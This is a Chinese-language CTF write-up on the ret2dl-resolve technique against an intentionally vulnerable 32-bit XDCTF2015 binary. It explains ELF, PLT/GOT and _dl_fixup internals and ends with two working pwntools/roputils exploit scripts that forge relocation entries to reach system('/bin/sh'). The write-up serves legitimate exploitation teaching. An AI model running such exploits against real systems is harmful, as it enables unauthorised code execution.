## 准备
PLT - Procedure Linkage Table  
GOT - GLOBAL OFFSET TABLE  
参考[pwn4.fun](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)  
测试程序源码，编译环境为ubuntu16.04 ,命令`gcc -o bof -m32 -fno-stack-protector bof.c`  
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```
## 从ELF文件格式开始
我们都知道 elf的`.text` 存放指令，`.data`存放数据，`.bss`存放未初始化变量等,这些Section的定义是由下面的数据结构决定。
```
typedef struct {
    Elf32_Word sh_name;      // 节头部字符串表节区的索引
    Elf32_Word sh_type;      // 节类型
    Elf32_Word sh_flags;     // 节标志，用于描述属性
    Elf32_Addr sh_addr;      // 节的内存映像
    Elf32_Off  sh_offset;    // 节的文件偏移
    Elf32_Word sh_size;      // 节的长度
    Elf32_Word sh_link;      // 节头部表索引链接
    Elf32_Word sh_info;      // 附加信息
    Elf32_Word sh_addralign; // 节对齐约束
    Elf32_Word sh_entsize;   // 固定大小的节表项的长度
} Elf32_Shdr;
```
使用命令 `readelf -S bof` 就可以看到
```
There are 31 section headers, starting at offset 0x18a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4
  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4
  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16
  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4
  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4
  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

## entries
如果程序由是`dynamically` 那么由于很多符号都是运行时绑定(plt got got.plt...) 那么为了完成这一过程，头部就增加了`PT_DYNAMIC`的Section，`.dynamic`段，包含了若干entries,结构如下
```c
typedef struct {
    Elf32_Sword d_tag;
    union {
        Elf32_Word d_val;
        Elf32_Addr d_ptr;
    } d_un;
} Elf32_Dyn;
```
使用命令`readelf -d bof` 就可以看到这个段的数据结构，注意Name/Value就是那个联合体。
```
 Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8048358
 0x0000000d (FINI)                       0x8048624
 0x00000019 (INIT_ARRAY)                 0x8049f08
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f0c
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x8048278
 0x00000006 (SYMTAB)                     0x80481d8
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048330
 0x00000011 (REL)                        0x8048318
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482f8
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482e4
 0x00000000 (NULL)                       0x0
```
## plt详解
`ret2dl`攻击方法就是我们自己伪造函数签名，然后在plt的过程中`glibc`伪造的函数地址写入到真实函数的got上，达到任意函数调用的效果。
首先看下调用write的过程。
```
pwndbg> plt
0x8048390: setbuf@plt
0x80483a0: read@plt
0x80483b0: strlen@plt
0x80483c0: __libc_start_main@plt
0x80483d0: write@pl
```
可知write的地址是`0x80483d0`

```
pwndbg> x /5i 0x80483d0
   0x80483d0 <write@plt>:       jmp    DWORD PTR ds:0x804a01c
   0x80483d6 <write@plt+6>:     push   0x20
   0x80483db <write@plt+11>:    jmp    0x8048380
   0x80483e0 <__gmon_start__@plt>:      jmp    DWORD PTR ds:0x8049ffc
   0x80483e6 <__gmon_start__@plt+6>:    xchg   ax,ax
```
jmp到了`0x804a01c`
```
pwndbg> x /10gx 0x804a01c
0x804a01c:      0x00000000080483d6      0x0000000000000000
0x804a02c:      0x0000000000000000      0x0000000000000000
```
实际调用了`0x80483d6` 即`write@plt+6` 可以看到jmp到了plt[0]
```
pwndbg> x /3i 0x8048380
   0x8048380:   push   DWORD PTR ds:0x804a004
   0x8048386:   jmp    DWORD PTR ds:0x804a008
   0x804838c:   add    BYTE PTR [eax],a
```
压入了.got[1]，跳转.got[2]
got[0]保存了.dynamic地址:`0x08049f14`，got[1]保存了linker的ID info:`0xf7ffd940`，got[2]保存了dynamic linker的地址:`0xf7fead90`,后面是各个函数的地址，这里是setbuf,read...
```
pwndbg> x /10w 0x08049ffc
0x8049ffc:      0x00000000      0x08049f14      0xf7ffd940      0xf7fead90
0x804a00c:      0x08048396      0x080483a6      0x080483b6      0xf7dffd90
```
实际上，这个过程执行了`_dl_runtime_resolve(link_map, reloc_arg)`,这个函数在`glibc-2.23/sysdeps/i386/dl-trampoline.S`这个汇编文件里会调用`_dl_fixup`，用来填充GOT，

```c
_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)
{
    // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg
    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    // 然后通过reloc->r_info找到.dynsym中对应的条目
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
    // 这里还会检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
    // 接着通过strtab+sym->st_name找到符号表字符串，result为libc基地址
    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    // value为libc基址加上要解析函数的偏移地址，也即实际地址
    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    // 最后把value写入相应的GOT表条目中
    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```
我们无法控制link_map(got[1])的值，只能控制reloc_arg。

## hacking _dl_fixup
这一以 `call write@plt`为例子.
首先，第一行代码通过`write@plt+6:0x20`，找到`JMPREL`中的write项，通过`.dynamic`可以发现，`JMPREL`的地址是`0x8048330`，其实就是`.rel.plt`,这个section的数据结构如下,`.rel.dyn`是用来变量重定位的，暂时不谈
```c
typedef struct {
    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址
    Elf32_Word r_info;      // 符号表索引
} Elf32_Rel;

#define ELF32_R_SYM(info) ((info)>>8)
#define ELF32_R_TYPE(info) ((unsigned char)(info))
#define ELF32_R_INFO(sym, type) (((sym)<<8)+(unsigned char)(type))
```
使用`readelf -r bof` 可以看到这两个段的数据结构，省略了`.rel.dyn`的输出
```
Relocation section '.rel.plt' at offset 0x330 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```
其中，offset就是`.got.plt`中保存的对应函数地址的地址，即*(0804a01c)=&write  
看上面和`.rel.dyn`相关的两个宏，可以求解出:
```
ELF32_R_SYM=6
ELF32_R_TYPE=7
```
也就是说Elf32_Sym[6]保存着write的符号表信息，Type为`R_386_JUMP_SLOT`。Elf32_Sym实际上就是
`.dynsym` section，这个section的数据结构如下:
```
typedef struct
{
    Elf32_Word st_name;     // Symbol name(string table index)
    Elf32_Addr st_value;    // Symbol value
    Elf32_Word st_size;     // Symbol size
    unsigned char st_info;  // Symbol type and binding
    unsigned char st_other; // Symbol visibility under glibc>=2.2
    Elf32_Section st_shndx; // Section index
} Elf32_Sym;
```
使用`readelf -s bof`可以看到
```
Symbol table '.dynsym' contains 10 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
     7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)
     8: 0804863c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
     9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2
```
第六个就是我们的write。  
好了，总结下思路，首先，通过ROP控制RIP执行_dl_runtime_resolve(link_map, reloc_arg),其中reloc_arg是我们可控的，控制reloc_arg 使得glibc 索引到我们伪造的`.rel.dyn`项上，我们可以在bss、data等段进行伪造，其次控制伪造的`r_info`值，从而控制`.dynsym`项，`r_offset`就是我们要改写的write的地址，所以使用原本的就OK，
我们看下`dynsym`的第六项（有更好的办法一定要告诉我啊）：
```
pwndbg> x /16xb 0x8048238
0x8048238:      0x4c    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x8048240:      0x00    0x00    0x00    0x00    0x12    0x00    0x00    0x00
```
可以发现`Elf32_Word st_name=0x4c`，也就是说 `.dynstr+04c`就是字符串write的地址.

```
pwndbg> x /s 0x08048278+0x4c
0x80482c4:      "write"
```
然后我们就可以伪造`.st_name`，把write改成system...  
好长的ROP啊

## exp
“你猜怎么伪造`.st_name`”

```py
#!/usr/bin/python

from pwn import *
elf = ELF('bof')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = "/bin/sh"
plt_0 = 0x08048380
rel_plt = 0x08048330
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x4c
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

“给出一个使用roputils的方法”
```py
from pwn import *
from roputils import ROP
fpath='./bof'
p=process(fpath)
elf=ELF(fpath)
rop=ROP(fpath)
# context.terminal=['zsh']
bss_addr=elf.bss()
ret_offset=0x6c+4
payload=rop.retfill(ret_offset)
base_stage=bss_addr+0x20
payload+=rop.call('read',0,base_stage,100)
#第一个是fake_reloc...的地址，第二个是调用函数的参数列表
payload+=rop.dl_resolve_call(base_stage+0x30,base_stage)
payload+=rop.fill(0x100,payload)
p.send(payload)

payload=rop.string('/bin/sh')
payload+=rop.fill(0x30,payload)
payload+=rop.dl_resolve_data(base_stage+0x30,'system')
payload+=rop.fill(100,payload)
p.send(payload)
p.interactive()
```